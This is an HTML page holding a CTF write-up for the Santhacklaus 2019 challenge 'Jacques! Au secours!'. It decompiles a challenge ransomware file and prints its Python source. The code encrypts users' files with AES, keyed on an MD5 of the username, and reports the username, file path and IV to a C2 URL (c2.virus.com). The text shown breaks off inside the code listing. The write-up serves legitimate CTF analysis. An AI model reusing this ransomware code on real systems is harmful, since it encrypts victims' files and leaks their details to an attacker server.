@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+    <link rel="manifest" href="/images/site.webmanifest">
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="With great knowledge comes great responsibility">
+    <title>Santhacklaus 2019: Jacques! Au secours! | Curiositas</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    <link rel="stylesheet" href="/css/theme-override.css">
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-155186129-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+<script>
+	MathJax = {
+		showMathMenu: false,
+		tex: {
+			inlineMath: [['$', '$'], ['\\(', '\\)']]
+		},
+		svg: {
+			fontCache: 'global'
+		}
+	};
+</script>
+<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js"></script>
+
+
+<header>
+	<nav>
+		<ul>
+			
+			
+			<li class="pull-left ">
+				<a href="/">~/curiositas</a>
+			</li>
+			
+			
+			<li class="pull-left ">
+				<a href="/about/">~/about</a>
+			</li>
+			
+			
+			<li class="pull-left ">
+				<a href="/categories/">~/categories</a>
+			</li>
+			
+
+			
+			
+			<li class="pull-right">
+				<a href="/index.xml">~/subscribe</a>
+			</li>
+			
+
+		</ul>
+	</nav>
+</header>
+
+  </head>
+
+  <body>
+    <br/>
+
+<div class="article-meta">
+<h1><span class="title">Santhacklaus 2019: Jacques! Au secours!</span></h1>
+
+<h2 class="date">2019/12/23</h2>
+<p class="terms">
+  
+  
+  Categories: <a href="/categories/ctf">CTF</a> <a href="/categories/writeup">Writeup</a> <a href="/categories/crypto">Crypto</a> 
+  
+  
+  
+  
+</p>
+</div>
+
+
+<div class="content-wrapper">
+  <main>
+    <h1 id="challenge">Challenge</h1>
+
+<div class="challenge">
+	<h2>Jacques! Au secours!</h2>
+	<h3>400 points</h2>
+	<div class="content">
+			<p>One of our VIP clients, who wishes to remain anonymous, has apparently been hacked and all their important documents are now corrupted.</p>
+<p>Can you help us recover the files? We found a strange piece of software that might have caused all of this.</p>
+<p>File: <a href="/files/jacques/chall_files.zip">chall_files.zip</a></p>
+
+	</div>
+</div>
+
+<p>The challenge gives us a zip file with:</p>
+<ul>
+<li>a &lsquo;vacation pictures&rsquo; folder containing
+<ul>
+<li>4 encrypted images
+<ul>
+<li><code>DCIM-0533.jpg.hacked</code></li>
+<li><code>DCIM-0535.jpg.hacked</code></li>
+<li><code>DCIM-0534.jpg.hacked</code></li>
+<li><code>DCIM-0536.jpg.hacked</code></li>
+</ul>
+</li>
+<li>a <code>READ_THIS.txt</code> file
+<ul>
+<li>&ldquo;We have hacked all your files. Buy 1 BTC and contact us at <a href="mailto:hacked@virus.com">hacked@virus.com</a>&rdquo;</li>
+</ul>
+</li>
+<li>a <code>virus.cpython-37.pyc</code> file: python3.7 script byte-compiled</li>
+</ul>
+</li>
+</ul>
+<h1 id="decompiling-the-virus">Decompiling the virus</h1>
+<p>The byte-compiled script can be decompiled using <a href="https://github.com/rocky/python-uncompyle6">uncompyle6</a>:</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; uncompyle6 virus.cpython-37.pyc &gt; virus.py
+</code></pre></div><p>We get the virus in a readable form:</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#228b22"># uncompyle6 version 3.6.0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#228b22"># Python bytecode 3.7 (3394)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#228b22"># Decompiled from: Python 3.7.5 (default, Oct 27 2019, 15:43:29) </span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#228b22"># [GCC 9.2.1 20191022]</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#228b22"># Embedded file name: /mnt/c/Users/Mat/Documents/_CTF/Santhacklaus/2019/virus.py</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span style="color:#228b22"># Size of source mod 2**32: 3473 bytes</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#8b008b;font-weight:bold">from</span> <span style="color:#008b45;text-decoration:underline">Crypto</span><span style="color:#008b45;text-decoration:underline">.</span><span style="color:#008b45;text-decoration:underline">Cipher</span> <span style="color:#8b008b;font-weight:bold">import</span> AES
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#8b008b;font-weight:bold">from</span> <span style="color:#008b45;text-decoration:underline">Crypto</span><span style="color:#008b45;text-decoration:underline">.</span><span style="color:#008b45;text-decoration:underline">Random</span> <span style="color:#8b008b;font-weight:bold">import</span> get_random_bytes
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">hashlib</span>, <span style="color:#008b45;text-decoration:underline">os</span>, <span style="color:#008b45;text-decoration:underline">getpass</span>, <span style="color:#008b45;text-decoration:underline">requests</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>TARGET_DIR = <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">C:</span><span style="color:#cd5555">\\</span><span style="color:#cd5555">Users</span><span style="color:#cd5555">&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>C2_URL = <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">https://c2.virus.com/</span><span style="color:#cd5555">&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>TARGETS = [<span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Scott Farquhar</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Lei Jun</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Reid Hoffman</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Zhou Qunfei</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jeff Bezos</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Shiv Nadar</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Simon Xie</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Ma Huateng</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Ralph Dommermuth</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Barry Lam</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Nathan Blecharczyk</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Judy Faulkner</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">William Ding</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Scott Cook</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Gordon Moore</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Marc Benioff</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Michael Dell</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Yusaku Maezawa</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Yuri Milner</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Bobby Murphy</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Larry Page</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Henry Samueli</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jack Ma</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jen-Hsun Huang</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jay Y. Lee</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Joseph Tsai</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Dietmar Hopp</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Henry Nicholas, III.</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Dustin Moskovitz</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Mike Cannon-Brookes</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Robert Miller</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Bill Gates</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Garrett Camp</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Lin Xiucheng</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Gil Shwed</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Sergey Brin</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Rishi Shah</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Denise Coates</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Zhang Fan</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Michael Moritz</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Robin Li</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Andreas von Bechtolsheim</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Brian Acton</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Sean Parker</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">John Doerr</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">David Cheriton</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Brian Chesky</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Wang Laisheng</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jan Koum</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jack Sheerack</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Terry Gou</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Adam Neumann</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">James Goodnight</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Larry Ellison</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Wang Laichun</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Masayoshi Son</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Min Kao</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Hiroshi Mikitani</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Lee Kun-Hee</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">David Sun</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Mark Scheinberg</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Yeung Kin-man</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">John Tu</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Teddy Sagi</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Frank Wang</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Robert Pera</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Eric Schmidt</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Wang Xing</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Evan Spiegel</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Travis Kalanick</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Steve Ballmer</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Mark Zuckerberg</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jason Chang</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Lam Wai Ying</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Romesh T. Wadhwani</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Liu Qiangdong</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jim Breyer</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Zhang Zhidong</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Pierre Omidyar</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Elon Musk</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">David Filo</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Joe Gebbia</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jiang Bin</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Pan Zhengmin</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Douglas Leone</span><span style="color:#cd5555">&#39;</span>, 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Hasso Plattner</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Paul Allen</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Meg Whitman</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Azim Premji</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Fu Liquan</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jeff Rothschild</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">John Sall</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Kim Jung-Ju</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">David Duffield</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Gabe Newell</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Scott Lin</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Eduardo Saverin</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Jeffrey Skoll</span><span style="color:#cd5555">&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Thomas Siebel</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Kwon Hyuk-Bin</span><span style="color:#cd5555">&#39;</span>]
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">get_username</span>():
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span>    <span style="color:#8b008b;font-weight:bold">return</span> getpass.getuser().encode()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span><span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">xorbytes</span>(a, b):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span>    <span style="color:#8b008b;font-weight:bold">assert</span> <span style="color:#658b00">len</span>(a) == <span style="color:#658b00">len</span>(b)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span>    res = <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span>    <span style="color:#8b008b;font-weight:bold">for</span> c, d <span style="color:#8b008b">in</span> <span style="color:#658b00">zip</span>(a, b):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span>        res += <span style="color:#658b00">bytes</span>([c ^ d])
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47</span>    <span style="color:#8b008b;font-weight:bold">return</span> res
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50</span><span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">lock_file</span>(path):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51</span>    username = get_username()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52</span>    hsh = hashlib.new(<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">md5</span><span style="color:#cd5555">&#39;</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53</span>    hsh.update(username)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54</span>    key = hsh.digest()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55</span>    cip = AES.new(key, <span style="color:#b452cd">1</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56</span>    iv = get_random_bytes(<span style="color:#b452cd">16</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57</span>    params = ((<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">target</span><span style="color:#cd5555">&#39;</span>, username), (<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">path</span><span style="color:#cd5555">&#39;</span>, path), (<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">iv</span><span style="color:#cd5555">&#39;</span>, iv))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58</span>    requests.get(C2_URL, params=params)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59</span>    <span style="color:#8b008b;font-weight:bold">with</span> <span style="color:#658b00">open</span>(path, <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">rb</span><span style="color:#cd5555">&#39;</span>) <span style="color:#8b008b;font-weight:bold">as</span> (fi):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60</span>        <span style="color:#8b008b;font-weight:bold">with</span> <span style="color:#658b00">open</span>(path + <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">.hacked</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">wb</span><span style="color:#cd5555">&#39;</span>) <span style="color:#8b008b;font-weight:bold">as</span> (fo):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61</span>            block = fi.read(<span style="color:#b452cd">16</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62</span>            <span style="color:#8b008b;font-weight:bold">while</span> block:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63</span>                <span style="color:#8b008b;font-weight:bold">while</span> <span style="color:#658b00">len</span>(block) &lt; <span style="color:#b452cd">16</span>:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64</span>                    block += <span style="color:#658b00">bytes</span>([<span style="color:#b452cd">0</span>])
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66</span>                cipherblock = cip.encrypt(xorbytes(block, iv))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67</span>                iv = cipherblock
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68</span>                fo.write(cipherblock)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69</span>                block = fi.read(<span style="color:#b452cd">16</span>)
